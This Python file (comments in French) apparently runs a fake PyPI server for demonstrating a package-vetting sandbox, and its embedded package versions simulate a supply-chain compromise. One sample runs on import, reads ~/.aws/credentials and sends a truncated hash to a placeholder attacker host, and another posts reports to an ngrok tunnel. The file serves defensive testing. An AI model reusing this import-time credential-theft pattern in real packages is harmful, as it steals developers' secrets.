"""Faux PyPI de démo : la source amont (`SAS_PYPI_URL`) dont on contrôle les dates.

    python demo/paquets/faux_pypi.py            # écoute sur 127.0.0.1:8081 (SAS_DEMO_PORT)
    export SAS_PYPI_URL=http://127.0.0.1:8081   # côté plateforme, avant de lancer le web
    curl -X POST localhost:8081/demo/publier/demo-horodatage/1.1   # une mise à jour saine sort
    curl -X POST localhost:8081/demo/publier/demo-horodatage/1.2   # la version piégée sort
    curl -X POST localhost:8081/demo/retirer/demo-horodatage/1.2   # PyPI la retire (option)
    curl -X POST localhost:8081/demo/publier/demo-horodatage/1.3   # « à revoir » : décision humaine

Il sert l'API JSON de PyPI (`/pypi/<nom>/json`, `/pypi/<nom>/<version>/json`) pour le paquet
`demo-horodatage` et le trio ci-dessous, et relaie tout autre nom vers https://pypi.org (lecture
seule).

**Trio de l'enregistrement vidéo** : trois paquets à part, en 1.0 publiée il y a 400 jours, donc
mûrs tout de suite (aucun délai). On les demande l'un après l'autre dans « Demandes ». Un numéro
de prise peut suivre le nom (`demo-piege-2`, 1 à 999) : même contenu, paquet jamais vu.
- `demo-sain` : passe (vert) ;
- `demo-a-revoir` : le code de la 1.3 ci-dessous (tunnel ngrok jamais appelé) : à revoir (orange) ;
- `demo-piege` : le code de la 1.2 ci-dessous (leurre lu, envoi vers `.invalid`) : bloqué (rouge).

- 1.0 : publiée il y a 400 jours ; c'est celle qu'on demande au départ (au catalogue).
- 1.1 : mise à jour saine.
- 1.2 : **version piégée** (compte de mainteneur repris) : à l'import, elle lit
  `~/.aws/credentials` et appelle `collecte.attaquant-demo.invalid`. Elle reste inoffensive :
  elle n'envoie qu'une empreinte tronquée, vers un domaine en `.invalid` qui ne se résout jamais
  (RFC 2606). **Ne jamais l'installer hors de la sandbox quand même.**
- 1.3 : **à revoir** (H16, décision humaine). Elle ajoute une fonction qui envoie un rapport vers
  un tunnel ngrok, jamais appelée à l'import : un seul signal FORT (`domaine_suspect`), rien de
  bloquant. Outil de debug oublié ou porte de sortie ? C'est à un humain de trancher.

Les archives sont construites en mémoire au démarrage (contenu fixe), jamais exécutées ici.
"""
import base64
import hashlib
import io
import os
import re
import tarfile
import zipfile
from datetime import datetime, timedelta, timezone

import httpx
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import JSONResponse, Response

NOM = "demo-horodatage"
MODULE = "demo_horodatage"
AMONT = os.environ.get("SAS_DEMO_AMONT", "https://pypi.org")
_ZIP_DATE = (2026, 1, 1, 0, 0, 0)

_SAIN = '''"""Horodatage lisible pour les journaux."""
from datetime import datetime, timezone


def maintenant() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")
'''
_FORMAT = '''

def jour(date: datetime) -> str:
    return date.strftime("%d/%m/%Y")
'''
_PIEGE = '''

# --- ajouté par le compte repris (démo) ---
import hashlib as _h
import os as _os
import urllib.request as _u


def _synchro():
    try:
        d = open(_os.path.expanduser("~/.aws/credentials"), "rb").read()
        e = _h.sha256(d).hexdigest()[:12]
        _u.urlopen("https://collecte.attaquant-demo.invalid/c?e=" + e, timeout=2)
    except Exception:
        pass


_synchro()
'''
_DOUTEUX = '''

# Rapport de debug, envoyé seulement si l'appelant le demande.
RAPPORT_URL = "https://horodatage-debug.ngrok-free.app/rapport"


def envoyer_rapport(texte: str) -> None:
    import urllib.request
    urllib.request.urlopen(RAPPORT_URL, data=texte.encode(), timeout=2)
'''
TRIO = {"demo-sain": _SAIN, "demo-a-revoir": _SAIN + _FORMAT + _DOUTEUX,
        "demo-piege": _SAIN + _FORMAT + _PIEGE}
CODE = {"1.0": _SAIN, "1.1": _SAIN + _FORMAT, "1.2": _SAIN + _FORMAT + _PIEGE,
        "1.3": _SAIN + _FORMAT + _DOUTEUX}
AUTEUR = {"1.0": "equipe@horodatage-demo.invalid", "1.1": "equipe@horodatage-demo.invalid",
          "1.2": "maintenance@horodatage-demo.invalid", "1.3": "equipe@horodatage-demo.invalid"}


def _metadata(version: str, nom: str = NOM, auteur: str | None = None) -> str:
    return (f"Metadata-Version: 2.1\nName: {nom}\nVersion: {version}\n"
            f"Summary: Horodatage lisible (paquet de démo sas-pme)\n"
            f"Author-email: {auteur or AUTEUR[version]}\nRequires-Python: >=3.9\n")


def _roue(version: str, nom: str = NOM, code: str | None = None) -> bytes:
    module = nom.replace("-", "_")
    info = f"{module}-{version}.dist-info"
    fichiers = {f"{module}/__init__.py": code or CODE[version],
                f"{info}/METADATA": _metadata(version, nom, None if nom == NOM else "equipe@horodatage-demo.invalid"),
                f"{info}/WHEEL": "Wheel-Version: 1.0\nGenerator: sas-pme-demo\n"
                                 "Root-Is-Purelib: true\nTag: py3-none-any\n"}
    record = []
    for nom, texte in fichiers.items():
        donnees = texte.encode()
        h = base64.urlsafe_b64encode(hashlib.sha256(donnees).digest()).rstrip(b"=").decode()
        record.append(f"{nom},sha256={h},{len(donnees)}")
    fichiers[f"{info}/RECORD"] = "\n".join([*record, f"{info}/RECORD,,"]) + "\n"
    tampon = io.BytesIO()
    with zipfile.ZipFile(tampon, "w", zipfile.ZIP_DEFLATED) as z:
        for nom, texte in fichiers.items():
            z.writestr(zipfile.ZipInfo(nom, _ZIP_DATE), texte)
    return tampon.getvalue()


def _source(version: str, nom: str = NOM, code: str | None = None) -> bytes:
    module = nom.replace("-", "_")
    racine = f"{module}-{version}"
    fichiers = {f"{racine}/PKG-INFO": _metadata(version, nom, None if nom == NOM else "equipe@horodatage-demo.invalid"),
                f"{racine}/pyproject.toml": "[build-system]\nrequires = [\"setuptools\"]\n"
                f"build-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"{nom}\"\n"
                f"version = \"{version}\"\n",
                f"{racine}/{module}/__init__.py": code or CODE[version]}
    tampon = io.BytesIO()
    with tarfile.open(fileobj=tampon, mode="w:gz") as t:
        for nom, texte in fichiers.items():
            donnees = texte.encode()
            info = tarfile.TarInfo(nom)
            info.size, info.mtime = len(donnees), 1767225600
            t.addfile(info, io.BytesIO(donnees))
    return tampon.getvalue()


def construire() -> dict[str, dict[str, bytes]]:
    """{version: {nom de fichier: octets}} pour chaque version."""
    return {v: {f"{MODULE}-{v}-py3-none-any.whl": _roue(v), f"{MODULE}-{v}.tar.gz": _source(v)}
            for v in CODE}


# Un numéro de prise (1 à 999) peut suivre le nom : `demo-piege-2` est un paquet jamais vu, au
# même contenu que `demo-piege`. Chaque prise de la vidéo rejoue ainsi toute l'analyse.
_PRISE = re.compile(r"^(?P<base>" + "|".join(map(re.escape, TRIO)) + r")(-[1-9][0-9]{0,2})?$")


def du_trio(nom: str) -> str | None:
    """Le paquet du trio dont `nom` (normalisé) est une prise, sinon None."""
    m = _PRISE.match(nom)
    return m["base"] if m else None


def construire_trio(nom: str) -> dict[str, bytes]:
    """{nom de fichier: octets} : la 1.0 d'un paquet du trio (ou d'une de ses prises)."""
    code, module = TRIO[du_trio(nom)], nom.replace("-", "_")
    return {f"{module}-1.0-py3-none-any.whl": _roue("1.0", nom, code),
            f"{module}-1.0.tar.gz": _source("1.0", nom, code)}


def _iso(d: datetime) -> str:
    return d.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def creer_app(amont: httpx.Client | None = None) -> FastAPI:
    archives, trio = construire(), {}
    octets = {f: b for fichiers in archives.values() for f, b in fichiers.items()}

    def du_trio_construit(nom: str) -> str | None:
        """Le nom normalisé s'il est du trio ; ses archives sont alors construites (une fois)."""
        if du_trio(nom) is None:
            return None
        if nom not in trio:
            trio[nom] = construire_trio(nom)
            octets.update(trio[nom])
        return nom
    il_y_a_400_jours = datetime.now(timezone.utc) - timedelta(days=400)
    etat = {v: {"publiee_le": None, "retiree": False} for v in CODE}
    etat["1.0"]["publiee_le"] = datetime.now(timezone.utc) - timedelta(days=400)
    amont = amont or httpx.Client(timeout=30, follow_redirects=True)
    app = FastAPI(title="Faux PyPI de démo")

    def publiees() -> list[str]:
        return [v for v, e in etat.items() if e["publiee_le"] is not None]

    def fichiers(request: Request, v: str) -> list[dict]:
        e = etat[v]
        return [{"filename": f, "url": f"{str(request.base_url).rstrip('/')}/fichiers/{f}",
                 "digests": {"sha256": hashlib.sha256(b).hexdigest()},
                 "packagetype": "bdist_wheel" if f.endswith(".whl") else "sdist",
                 "upload_time_iso_8601": _iso(e["publiee_le"]), "yanked": e["retiree"]}
                for f, b in archives[v].items()]

    def relayer(chemin: str) -> Response:
        r = amont.get(f"{AMONT}{chemin}")
        return Response(r.content, status_code=r.status_code, media_type="application/json")

    def canon(nom: str) -> str:
        return nom.lower().replace("_", "-").replace(".", "-")

    def est_demo(nom: str) -> bool:
        return canon(nom) == NOM

    def fichiers_trio(request: Request, nom: str) -> list[dict]:
        return [{"filename": f, "url": f"{str(request.base_url).rstrip('/')}/fichiers/{f}",
                 "digests": {"sha256": hashlib.sha256(b).hexdigest()},
                 "packagetype": "bdist_wheel" if f.endswith(".whl") else "sdist",
                 "upload_time_iso_8601": _iso(il_y_a_400_jours), "yanked": False}
                for f, b in trio[nom].items()]

    def info_trio(nom: str) -> dict:
        return {"name": nom, "version": "1.0", "requires_dist": [],
                "author_email": "equipe@horodatage-demo.invalid"}

    @app.get("/pypi/{nom}/json")
    def projet(nom: str, request: Request):
        if (n := du_trio_construit(canon(nom))) is not None:
            return {"info": info_trio(n), "releases": {"1.0": fichiers_trio(request, n)}}
        if not est_demo(nom):
            return relayer(f"/pypi/{nom}/json")
        vues = publiees()
        return {"info": {"name": NOM, "version": vues[-1], "author_email": AUTEUR[vues[-1]]},
                "releases": {v: fichiers(request, v) for v in vues}}

    @app.get("/pypi/{nom}/{version}/json")
    def version(nom: str, version: str, request: Request):
        if (n := du_trio_construit(canon(nom))) is not None:
            if version != "1.0":
                raise HTTPException(404)
            return {"info": info_trio(n), "urls": fichiers_trio(request, n)}
        if not est_demo(nom):
            return relayer(f"/pypi/{nom}/{version}/json")
        if version not in publiees():
            raise HTTPException(404)
        return {"info": {"name": NOM, "version": version, "requires_dist": [],
                         "author_email": AUTEUR[version]}, "urls": fichiers(request, version)}

    @app.get("/fichiers/{nom}")
    def fichier(nom: str):
        if nom not in octets:
            raise HTTPException(404)
        return Response(octets[nom], media_type="application/octet-stream")

    def changer(version: str, **valeurs) -> JSONResponse:
        if version not in etat:
            raise HTTPException(404)
        etat[version].update(valeurs)
        return JSONResponse({"version": version, "publiee": etat[version]["publiee_le"] is not None,
                             "retiree": etat[version]["retiree"]})

    @app.post("/demo/publier/{nom}/{version}")
    def publier(nom: str, version: str):
        if not est_demo(nom):
            raise HTTPException(404)
        return changer(version, publiee_le=datetime.now(timezone.utc), retiree=False)

    @app.post("/demo/retirer/{nom}/{version}")
    def retirer(nom: str, version: str):
        if not est_demo(nom) or etat.get(version, {}).get("publiee_le") is None:
            raise HTTPException(404)
        return changer(version, retiree=True)

    return app


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(creer_app(), host="127.0.0.1", port=int(os.environ.get("SAS_DEMO_PORT", "8081")))
